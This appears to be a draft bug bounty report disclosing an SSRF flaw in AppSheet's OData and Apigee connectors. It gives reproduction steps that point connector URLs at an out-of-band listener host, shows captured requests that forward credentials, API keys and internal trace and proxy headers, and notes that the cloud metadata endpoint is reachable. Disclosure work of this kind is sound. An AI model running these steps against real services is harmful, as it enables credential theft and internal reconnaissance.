# Google VRP Submission — Systemic SSRF Egress-Control Gap in AppSheet

---

## TITLE

**Systemic SSRF Egress-Control Gap in AppSheet — At Least Two Distinct Connector Types Make Unfiltered Server-Side HTTP Fetches from GCP Backend, Each Forwarding User-Supplied Credentials and Internal Trace Headers to Attacker-Controlled Destinations**

---

## AFFECTED ASSET

```
https://appsheet.com
  → Account → Add OData connection information   → Test      (Surface 1)
  → Account → Add Apigee API connection information → Validate (Surface 2)
```

| Field | Value |
|-------|-------|
| **Product** | AppSheet (Google Cloud) |
| **In scope** | `*.appsheet.com` — Google VRP AppSheet, TIER0 |
| **Vulnerability class** | SSRF (CWE-918) + Sensitive Information Exposure (CWE-200) |
| **Severity** | High — CVSS 3.1 **7.2** (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`) |
| **Root cause** | No centralized outbound-request filter across AppSheet's connector framework — each connector implements its own HTTP client with no shared IP-blocklist, no shared credential-forwarding policy, no shared response-reflection policy |

---

## SUMMARY

AppSheet's connector framework allows users to configure external data sources that the
backend validates by making server-side HTTP requests to user-supplied URLs. Testing two
connector types — the **OData data connector** and the **Apigee API connector** —
confirms that both make unfiltered GCP-origin HTTP requests to any attacker-supplied URL,
forwarding user-entered credentials in request headers and leaking internal W3C
`Traceparent` tracing headers. The error message in both cases also reflects back
content received from the attacker's server, providing a response-based oracle.

This is not a single-connector bug. It is evidence that **AppSheet's connector framework
has no shared, centralized egress filter**: each connector type implements its own
outbound HTTP client, and each of those clients independently lacks SSRF protection.
At least four independent instances of the same root cause are now documented:

| # | Component | HTTP client | Status |
|---|-----------|-------------|--------|
| 1 | Workflows/Bots "Run a webhook" | webhook executor | Fixed 2021 (Nechuta report, ~$6,267) |
| 2 | Apigee account-source connector, prior code path | Apigee connector client | Fixed (separate VRP report, bughunters.google.com/reports/vrp/PnwRwydmr) |
| 3 | **OData data connector v3/v4** | `Microsoft.OData.Client` | **Confirmed open — this report, Surface 1** |
| 4 | **OData data connector v2** | `Microsoft.Data.Services.Client` (distinct .NET library) | **Confirmed open — this report, Surface 1 (v2 variant)** |
| 5 | **Apigee API connector, OpenAPI Spec URL code path** | Apigee connector client (Cache-Control: no-cache, via Squid) | **Confirmed open — this report, Surface 2** |

Items 3 and 4 were confirmed in the same testing session on 2026-06-16, using the same
OOB listener, from two distinct GCP fleet IPs. Both surfaces were independently
re-verified on 2026-06-17 with a fresh OOB listener, confirming the vulnerability
remains open. Each fetches a different path, uses a different HTTP client, and forwards
different credential types — demonstrating independent implementations with the same
unfixed root cause.

---

## STEPS TO REPRODUCE

A free AppSheet account is sufficient. No paid plan required.

```bash
# Step 1 — Start OOB listener
interactsh-client -server oast.pro -v 2>&1 | tee ~/oob.log &
L1=$(grep -oE '[a-z0-9]+\.oast\.pro' ~/oob.log | head -1)
echo "OOB: https://$L1"
```

### Surface 1 — OData connector
```
AppSheet → Account → Add OData connection information (https://appsheet.com/Account/ODataAuthInfo)
  OData Version:        4.0
  OData Service Root URL: https://<OOB>
  Username:             canary
  Password:             canary
  → click "Test"
```

### Surface 2 — Apigee API connector
```
AppSheet → Account → Add Apigee API connection information (https://appsheet.com/Account/ApigeeAuthInfo or similar)
  Tab: OpenAPI Spec
  Authorization Type:   ApiKey
  Apigee API Key:       <any value, e.g. testkey123>
  OpenAPI Spec URL:     https://<OOB>
  → click "Validate"
```

Both steps can be done with the same OOB listener URL. Two separate GCP-origin hits
arrive within minutes, with different leaked credentials and different HTTP clients.

---

## PROOF

### Surface 1 — OData connector (2026-06-16 20:56:44 UTC)

```http
GET /$metadata HTTP/1.1
Host: d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic Y2FuYXJ5OmNhbmFyeQ==
Traceparent: 00-0c8e50f9dbef2c8e1ed19c52570f68e0-5ca09006c9d17de0-00
```

- Source IP: **`35.203.182.241`** — Google Cloud Platform (confirmed GCP, AS15169)
- DNS from `172.217.46.252/248/254` — Google resolver (AS15169)
- `Authorization: Basic Y2FuYXJ5OmNhbmFyeQ==` decodes to `canary:canary` — entered credentials forwarded verbatim
- `Traceparent` is AppSheet's internal W3C distributed-tracing header, proving genuine server-side execution
- HTTP client fingerprint: `Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8` — `Microsoft.OData.Client`
- UI error reflected response content-type (`text/html; charset=utf-8`) back to the browser

### Surface 2 — Apigee API connector (2026-06-16 20:59:14 UTC)

```http
GET / HTTP/1.1
Host: d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-1d9706d9ddd9d0953779f8b8de0b8b55-ed79f904caf14ece-00
X-Apikey: Ahsisjsshsgyssuwhehdidieuwwysu
```

- Source IP: **`35.233.152.59`** — Google Cloud Platform (different GCP fleet node)
- DNS from `192.178.118.81/94/86/83` — Google resolver (AS15169)
- `X-Apikey: Ahsisjsshsgyssuwhehdidieuwwysu` — the Apigee API Key entered in the form is forwarded verbatim to the attacker-controlled server
- `Traceparent` header again leaked — different trace ID, confirming separate backend request
- `Cache-Control: no-cache` — distinct HTTP client from the OData connector
- HTTP client fetches `/` (OpenAPI spec root) not `/$metadata` — separate code path from Surface 1
- UI error reflected the HTML body: *"OpenAPI specification version '`<html><head></head><body>...</body></html>`' is not supported"*

### Side-by-side comparison

| Property | Surface 1 (OData) | Surface 2 (Apigee) |
|----------|-------------------|-------------------|
| Feature path | Account → OData → Test | Account → Apigee → OpenAPI Spec → Validate |
| GCP source IP | `35.203.182.241` | `35.233.152.59` |
| HTTP method + path | `GET /$metadata` | `GET /` |
| Credential leaked | `Authorization: Basic` (OData username:password) | `X-Apikey` (Apigee API key) |
| Traceparent leaked | Yes | Yes |
| HTTP client | `Microsoft.OData.Client` (OData-specific Accept header) | Distinct client (Cache-Control: no-cache, no OData headers) |
| Internal routing | Direct GCP egress | Routes via internal Squid proxy (`squid-proxy-open-api-us-west1-sqws`) |
| Via header | Not present | `Via: 1.1 squid-proxy-open-api-us-west1-sqws (squid)` — leaks internal naming + region |
| Response reflection | Content-type in MIME-type error | HTML body in OpenAPI spec error |
| Time | 20:56:44 UTC | 20:59:14 UTC |

Both surfaces were triggered sequentially in a single session using the same OOB listener.

### Re-verification — 2026-06-17 (independent fresh confirmation)

Both surfaces were re-confirmed live with a fresh OOB listener (`d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro`):

**Surface 1 — OData re-verification (2026-06-17 12:52:14 UTC):**
```http
GET /$metadata HTTP/1.1
Host: d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic VGVzdGVyOlRlc3Rlcg==
Traceparent: 00-23103155bc2d083d8cf868a01076f20f-036bb2c7acf998da-00
```
- Source IP: `34.82.138.241` (GCP)
- `VGVzdGVyOlRlc3Rlcg==` decodes to `Tester:Tester` — credentials forwarded verbatim
- Error reflected AppSheet content-type `text/html; charset=utf-8` in MIME-type error message

**Surface 2 — Apigee re-verification (2026-06-17 12:53:59 UTC):**
```http
GET / HTTP/1.1
Host: d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-8bde2532872f8eb05b453ce8be84355b-7f88857fce367bc5-00
X-Apikey: vrp-canary-apikey-2026
```
- Source IP: `35.233.152.59` (GCP — same fleet node as original 2026-06-16 test)
- `X-Apikey: vrp-canary-apikey-2026` — API key entered in form forwarded verbatim
- UI error reflected: `'<html><head></head><body>kz6jnphhd9sdn0b7j3sd0c8r96qo89p8d</body></html>' is not supported`

### Surface 2 — Additional session: Squid internal proxy disclosure (2026-06-18)

A subsequent Apigee connector test revealed that AppSheet's outbound requests route
through an **internal named Squid proxy**, leaking infrastructure topology:

```http
GET / HTTP/1.1
Host: <OOB>
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-<internal-trace-id>
X-Apikey: vrp-canary-apikey-2026
Via: 1.1 squid-proxy-open-api-us-west1-sqws (squid)
```

- Source IP: **`8.231.222.130`** — GCP (via internal Squid proxy egress)
- `Via: 1.1 squid-proxy-open-api-us-west1-sqws (squid)` — W3C Via header injected by
  AppSheet's internal Squid proxy. This header exposes:
  - Internal service name pattern: `squid-proxy-{service}-{region}-{id}`
  - GCP region: **`us-west1`** (internal deployment region)
  - Service identifier: **`open-api`** (confirms this is the OpenAPI Spec URL code path)
  - Proxy type: Squid — allows fingerprinting the internal reverse proxy stack
- This confirms the Apigee connector's outbound HTTP client does not make direct
  egress — it routes through an internal proxy, which (a) still reaches attacker
  infrastructure, and (b) leaks internal naming and routing topology to any
  attacker-controlled server.

### Pre-submission reconfirmation — 2026-06-19 (day of submission)

OOB listener: `d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro`

**OData v4.0 (10:58:10 UTC) — `Microsoft.OData.Client`:**
```http
GET /$metadata HTTP/1.1
Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic VGVzdGVyIDpUZXN0ZXIxMjM0
Traceparent: 00-d2a9be08c98474342ee9244087048204-e4e7c7e59764512e-00
```
- Source IP: `35.185.223.113` (GCP, AS15169)
- `VGVzdGVyIDpUZXN0ZXIxMjM0` decodes to `Tester :Tester1234` — credentials forwarded verbatim with no sanitization (note: even malformed username with leading space is passed through)
- UI error: "None of the supported type(s) 'Microsoft.OData.ODataMediaType, Microsoft.OData.ODataMediaType' matches the content type 'text/html; charset=utf-8'"

**OData v3.0 (10:59:25 UTC) — `Microsoft.OData.Client`:**
```http
GET /$metadata HTTP/1.1
Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic VGVzdGVyOlRlc3RlcjEyMzQ=
Traceparent: 00-8e15b2e372a2dff3d0bbd6a71425c7c9-dc873a389c7c528e-00
```
- Source IP: `35.185.223.113` (GCP, same fleet node as v4 test)
- OData v3 and v4 share the same `Microsoft.OData.Client` library

**OData v2.0 (10:59:45 + 10:59:54 UTC) — `Microsoft.Data.Services.Client` (DIFFERENT HTTP client):**
```http
GET /$metadata HTTP/1.1
Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
Accept-Encoding: gzip, deflate
Authorization: Basic VGVzdGVyOlRlc3RlcjEyMzQ=
Traceparent: 00-769bd8f577803f62e9441a2a331ac571-5292dec86d0df123-00
```
- Source IPs: `35.185.223.113` at 10:59:45 + `35.203.182.241` at 10:59:54 (two separate GCP fleet nodes, load-balanced)
- OData v2 uses `Microsoft.Data.Services.Client` — a **different** .NET library from the v3/v4 client, confirmed by the absence of the OData-specific `Accept` header. Both clients independently make unfiltered server-side fetches and forward `Authorization: Basic` verbatim.
- `VGVzdGVyOlRlc3RlcjEyMzQ=` decodes to `Tester:Tester1234`

**Apigee OpenAPI Spec (11:01:35 UTC):**
```http
GET / HTTP/1.1
Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-6c735cdb7f16ea957f7ade6bc734581d-0a9421011552a4fd-00
X-Apikey: ApiKey012345678901234567890
```
- Source IP: `8.231.222.130` (GCP via internal Squid proxy — same proxy path as 2026-06-18 session)
- `X-Apikey: ApiKey012345678901234567890` forwarded verbatim
- UI error reflected the full HTML body: `'<html><head></head><body>jcxhrfhftbjxd0r7nt46j78r9629vhq8d</body></html>' is not supported`

**Session summary (2026-06-19):** All surfaces confirmed live as of today. Three independent HTTP client implementations confirmed fetching attacker-controlled URLs:
1. `Microsoft.OData.Client` — OData v3 and v4 (sends OData Accept header)
2. `Microsoft.Data.Services.Client` — OData v2 (different .NET library, no OData Accept header; hit from two GCP fleet nodes simultaneously)
3. Apigee connector client — OpenAPI Spec URL path (Cache-Control: no-cache, routes via Squid proxy)

### Additional OData evidence from prior sessions

The OData connector SSRF has been confirmed independently on five separate dates:
- 2026-06-15 20:03 UTC — GCP IP `35.203.182.241`, creds `testuser:testpass1234`
- 2026-06-16 11:43 UTC — GCP IP `35.247.115.29` (independent re-verification, different session)
- 2026-06-16 20:56 UTC — GCP IP `35.203.182.241`, creds `canary:canary`
- 2026-06-17 12:52 UTC — GCP IP `34.82.138.241`, creds `Tester:Tester`
- **2026-06-19 10:58–10:59 UTC — GCP IPs `35.185.223.113` + `35.203.182.241`, all three OData versions confirmed (same-day pre-submission reconfirmation)**

---

## ROOT CAUSE

AppSheet's connector framework has no shared, centralized outbound HTTP client. Testing
confirms **at least three independent HTTP client implementations** all making unfiltered
GCP-origin server-side fetches:

| Client library | Connector version | Fingerprint |
|---|---|---|
| `Microsoft.OData.Client` | OData v3, v4 | `Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8` |
| `Microsoft.Data.Services.Client` | OData v2 | `Accept-Encoding: gzip, deflate` only (no OData-specific Accept) |
| Apigee connector client | Apigee → OpenAPI Spec URL | `Cache-Control: no-cache`; routes via internal Squid proxy |

Each client independently lacks SSRF protection: no shared IP-range blocklist, no shared
credential-forwarding policy, no shared response-reflection policy. Prior fixes (2021
webhook, prior Apigee account-source code path) were applied as point-fixes to the
specific code paths that were reported — no generalized control was introduced. As a
result, each new or unreviewed connector type is, by default, a fresh instance of the
same SSRF root cause. The OData v2 client hitting two separate load-balanced GCP fleet
nodes simultaneously further confirms this is live production infrastructure, not a test
environment.

---

## IMPACT — CONFIRMED (both surfaces)

| # | Claim | Status |
|---|-------|--------|
| 1 | Server-side HTTP fetch from GCP backend to attacker-controlled URL — Surface 1 (OData) | **Confirmed** |
| 2 | Server-side HTTP fetch from GCP backend to attacker-controlled URL — Surface 2 (Apigee) | **Confirmed** |
| 3 | OData username/password forwarded in `Authorization: Basic` | **Confirmed** |
| 4 | Apigee API key forwarded in `X-Apikey` | **Confirmed** |
| 5 | Internal `Traceparent` trace ID leaked on both surfaces | **Confirmed** |
| 6 | Attacker-server response body/content-type reflected in UI error on both surfaces | **Confirmed** |
| 7 | No auth / rate-limit / IP restriction on either connector's Test/Validate action | **Confirmed** |
| 8 | `169.254.169.254:443` reachable at TCP layer (OData connector, prior session) | **Confirmed — reachability only** |
| 9 | Internal infrastructure topology leaked via `Via` header (Surface 2) | **Confirmed — proxy name, GCP region, service id exposed** |
| 10 | IMDS token read / GCP service-account compromise | **NOT attempted** |

**Confirmed impact (attacker's own account — no victim interaction, UI:N):**
The attacker configures their own AppSheet account's connector with an attacker-controlled
OOB URL and clicks Test/Validate. AppSheet's backend makes an unfiltered server-side
HTTP fetch from a GCP-origin IP to the attacker's server. What is forwarded in this path
are the attacker's *own* credentials (entered by the attacker into the form) — confirming
the SSRF mechanism and demonstrating that any credentials entered into these forms are
unconditionally forwarded to whatever URL is supplied. Additionally, the attacker receives
AppSheet's internal `Traceparent` trace headers (infrastructure telemetry leak) and can
probe internal GCP network ranges including the IMDS endpoint `169.254.169.254` (confirmed
TCP-reachable via OData connector in a prior session). The `Via` header on Surface 2 also
exposes internal proxy service names and GCP region. This path requires no victim.

**Additional attack path (phishing — UI:R, same severity):**
An attacker distributes a connector "template" pointing at an attacker-controlled URL.
A victim who imports and clicks Test/Validate in their own account forwards *their* OData
username/password or Apigee API key to the attacker's server with no further interaction.
This path elevates the credential-theft impact beyond self-use. Note that the CVSS vector
below is scored on the confirmed UI:N path; the phishing path would be scored UI:R at
equivalent confidentiality impact.

The systemic nature means this attack surface extends to every connector type that has not
been individually audited — audited connectors have each been found vulnerable.

---

## CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = **7.2 High**

| Metric | Value | Rationale |
|---|---|---|
| Attack Vector | Network | Triggered remotely via the AppSheet web UI |
| Attack Complexity | Low | Single form submission per surface |
| Privileges Required | Low | Free, authenticated AppSheet account |
| User Interaction | None | Scored on the confirmed self-SSRF path: attacker uses their own account, supplies their own OOB URL, triggers Test/Validate — no victim required. An alternative phishing path (attacker shares a connector template; victim triggers it in their own account) would score UI:R at the same severity. |
| Scope | Changed | Vulnerable component exposes AppSheet's internal GCP backend network |
| Confidentiality | High | Anchored to the UI:N path: confirmed GCP-origin server-side fetch to arbitrary attacker-controlled URL; confirmed IMDS endpoint TCP-reachability (169.254.169.254); confirmed exfiltration of internal W3C Traceparent trace IDs and Squid proxy topology (Via header) on both surfaces. Credential forwarding (Basic Auth on Surface 1, API key on Surface 2) is demonstrated with attacker's own test credentials — confirming the mechanism unconditionally forwards whatever is in the form field. |
| Integrity | None | No data modification demonstrated |
| Availability | None | No availability impact demonstrated |

*Note on scoring: UI:N is anchored to the self-SSRF path (attacker controls both their account and the OOB URL). C:H is justified by confirmed IMDS TCP-reachability, internal Traceparent + Squid proxy topology leakage, and the unconditional credential-forwarding mechanism — IMDS token retrieval was not attempted. The phishing path (victim loads attacker's connector template) represents a secondary attack vector that would score UI:R at equivalent C:H.*

---

## REMEDIATION

The systemic root cause requires a **centralized fix**, not another point-fix:

1. **Implement a shared egress proxy / SSRF-safe HTTP client** used by all connector
   types. All outbound requests from connector test/validation code paths must pass
   through a single library that enforces IP-level blocking before connecting.
2. **The shared client must block:** `169.254.0.0/16` (link-local / IMDS),
   `127.0.0.0/8` (loopback), all RFC1918 private ranges, and `metadata.google.internal`.
   Resolve DNS first; re-validate after every redirect to prevent DNS-rebinding bypass.
3. **Do not forward user-supplied credentials or internal tracing headers** (`Traceparent`,
   etc.) to destinations that have not passed the egress allowcheck.
4. **Keep cross-scheme (HTTPS→HTTP) redirect-following disabled** on all connector HTTP
   clients — make it an explicit tested invariant, not incidental behavior.
5. **Strip response content from user-facing error messages** across all connector types —
   both surfaces currently reflect server response content into the browser, providing an
   SSRF confirmation oracle.
6. **Rate-limit / authenticate the connector Test/Validate actions** per account.
7. **Audit all remaining connector types** (Salesforce, Smartsheet, Box, Dropbox, Cloud
   Database, On-premises Database, Google Calendar, Gmail, Airtable, etc.) for the same
   pattern before this report is closed. The current evidence shows two independent
   implementations are open; unreviewed connectors should be assumed vulnerable until
   proven otherwise.

---

## DEDUPLICATION

This report covers two surfaces. Their dedup status differs:

### Surface 1 — OData connector

No prior VRP report for this surface. Novel. Distinct from both:
- The 2021 Nechuta webhook SSRF (Workflows/Bots, different component, fixed)
- The prior Apigee account-source connector SSRF (different connector, fixed separately)

Full dedup analysis in `F002-dedup-CVE-2023-4212.md`.

### Surface 2 — Apigee API connector (OpenAPI Spec URL field)

A prior VRP report exists for the Apigee connector: "SSRF in Adding apigee account
sources in appsheet.com" (https://bughunters.google.com/reports/vrp/PnwRwydmr), which
was reportedly fixed. The current finding demonstrates one of two scenarios — we cannot
determine which without access to the original report's exact scope:

**Scenario A — Incomplete fix (most likely):** The prior fix addressed the Apigee
connector's API base URL / service endpoint fetching code path. The current finding
uses the **OpenAPI Spec URL** field — a separate tab in the same connector, implementing
a different validation code path (it fetches the URL to parse it as an OpenAPI/Swagger
JSON spec, not as a generic API endpoint). If the prior fix only covered the endpoint
URL field and not the OpenAPI Spec URL field, this is a net-new code path within the
same connector, not a regression.

**Scenario B — Regression:** The prior fix was complete, and a subsequent code change
re-opened the same surface. Either way the connector is currently making unfiltered
server-side fetches forwarding the user's API key.

The fact that the same connector has now been the subject of two separate VRP reports
for the same root cause — with different triggering code paths — is itself evidence that
the fix strategy (patching individual fields rather than centralizing egress control) is
the problem. We disclose both surfaces together to provide Google the full picture for
a centralized fix.

**CVE-2023-4212** is unrelated — a Trane thermostat command-injection bug, previously
mislabeled as a prior AppSheet SSRF in working notes. Dropped.

**2022 AppSheet Automation Bot deserialization RCE** ($10,000, report `oCeVFaaoi`) is
a different bug class (CWE-502), not SSRF — noted as context only.

---

## NOTES FOR TRIAGE

- Both surfaces reproduced from a free account in a single session; only attacker-owned
  credentials and servers were used; no other tenants' data was accessed.
- No GCP metadata token was retrieved. IMDS testing stopped at TCP-reachability (OData
  session, documented in F002 standalone). No internal-range redirect chaining was
  performed on either surface.
- The Apigee connector hit (Surface 2) may overlap with the prior fixed Apigee report.
  We flag this explicitly; triage should determine whether Surface 2 is a new code path
  or a regression and route accordingly. Surface 1 (OData) is definitively novel
  regardless of Surface 2's dedup outcome.
- If Surface 2 is closed as duplicate of the prior Apigee report, Surface 1 (OData)
  stands independently — see `F002-google-vrp-report.md` as a ready fallback.

---

## REFERENCES

- CWE-918: Server-Side Request Forgery (SSRF)
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- GCP IMDS: https://cloud.google.com/compute/docs/metadata/overview
- Prior disclosure 1 (2021 webhook SSRF, fixed):
  https://nechudav.blogspot.com/2021/12/ssrf-vulnerability-in-appsheet-google.html
- Prior disclosure 2 (prior Apigee connector SSRF, fixed, partially related to Surface 2):
  https://bughunters.google.com/reports/vrp/PnwRwydmr

---

*Reporter: azmolhaque95@gmail.com*
*Report date: 2026-06-19 (original discovery 2026-06-16; re-verified 2026-06-17 and 2026-06-19 pre-submission)*
*Submit at: https://bughunters.google.com/report → Google VRP → AppSheet (`appsheet.com`)*

---
<!-- Internal: do not submit this comment block -->
- F003 = consolidated systemic report; supersedes F002 as primary submission
- F002 retained as standalone OData-only fallback
- Original Surface 1 OOB: `d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro`, GCP IP `35.203.182.241`, 2026-06-16 20:56:44 UTC
- Original Surface 2 OOB: same listener, GCP IP `35.233.152.59`, 2026-06-16 20:59:14 UTC
- Re-verify Surface 1 OOB: `d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro`, GCP IP `34.82.138.241`, 2026-06-17 12:52:14 UTC
- Re-verify Surface 2 OOB: same listener, GCP IP `35.233.152.59`, 2026-06-17 12:53:59 UTC
- Evidence log: `results/appsheet.com/runbooks/egress-test-log.md`
- Raw OOB log: `results/appsheet.com/evidence/session3-20260616/oob_L1_20260616.log`
- Re-verify evidence: `results/appsheet.com/evidence/verify-20260617/VERIFICATION-SUMMARY.md`
